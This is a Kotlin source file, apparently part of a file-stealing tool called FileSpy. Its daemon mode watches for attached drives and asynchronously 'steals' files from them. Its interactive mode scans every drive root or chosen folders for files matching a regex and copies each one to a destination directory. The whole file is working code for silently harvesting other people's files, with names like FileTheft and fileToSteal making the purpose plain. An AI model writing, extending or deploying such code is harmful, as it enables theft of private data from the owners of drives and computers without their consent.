package studio.papercube.sh.filespy

import studio.papercube.library.argparser.Parameter
import java.io.File
import java.util.regex.Pattern
import java.util.stream.Collectors


abstract class FileSpy constructor(para: Parameter) {
    companion object {
        fun build(para: Parameter): FileSpy? = when {
            para.hasFlag("-version") -> {
                System.out.println(VERSION)
                null
            }
            para.hasFlag("-interactive") -> Interactive(para)
            else -> Daemon(para)
        }
    }

    abstract fun start()

    class Daemon(para: Parameter) : FileSpy(para) {
        val properties = ConfigParameters.instance

        val driverDetector: DriverDetector = DriverDetector(gainAccessListener = {
            FileTheft(it).stealAsync()
        })


        override fun start() = driverDetector.start()
    }

    class Interactive(private val para: Parameter) : FileSpy(para) {
        private val reader = System.`in`.bufferedReader()
        private var regex: Regex = Pattern.compile(ConfigParameters.instance.regex).toRegex()
        private var destination = File(".")

        override fun start() {
            log.enabled = false
            para.getSingleValue("-regex")?.let { regex = Pattern.compile(it).toRegex() }
            println()
            println("Select file destination. Current executable exists in ${System.getProperty("java.class.path")}")
            destination = File(reader.readLine())
            if (!destination.isDirectory && !destination.mkdirs()) println("WARNING: destination folder is not a directory")

            print("Search all directories? [y/n] ")

            if (reader.readLine()[0].toLowerCase() == 'y') searchAll()
            else {
                println("Enter directories to search. Use semicolons \";\" as separator.")
                println("${File.listRoots().joinToString(separator = ";", transform = { it.toString() })} available")
                val directories = reader.readLine().split(";").map { File(it) }
                search(directories)
            }

            log.enabled = true
        }

        private fun searchAll() {
            search(File.listRoots().toList())
        }

        private fun search(files: List<File>) {
            println("Using regex $regex to search files. If you'd like to change the pattern, specify -regex arg.")
            for (file in files) {
                try {
                    println("Scanning ${file.absolutePath}")
                    val walkResult = FileWalker(file).walk()
                            .parallelStream()
                            .filter { it.name.matches(regex) }
                            .collect(Collectors.toList())

                    val size = walkResult.size
                    println("$size files matches.")
                    for ((index, fileToSteal) in walkResult.withIndex()) {
                        println("Copying ${index + 1} of $size files")
                        FileTheft.stealSingleFile(fileToSteal, destination)
                    }
                } catch (e: Exception) {
                    println("Uncaught exception $e")
                }
                println()
            }
        }

    }
}


